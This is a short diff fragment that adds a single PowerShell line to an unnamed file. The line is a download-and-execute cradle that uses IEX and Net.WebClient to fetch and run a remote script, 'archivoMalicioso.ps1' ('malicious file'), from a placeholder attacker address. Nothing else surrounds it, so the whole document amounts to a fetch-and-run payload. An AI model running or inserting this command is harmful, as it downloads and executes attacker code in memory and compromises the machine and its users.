@@ -1,0 +1,2 @@
+
+::: IEX(New-Object Net.WebClient).downloadString('http://miIpHere/archivoMalicioso.ps1')
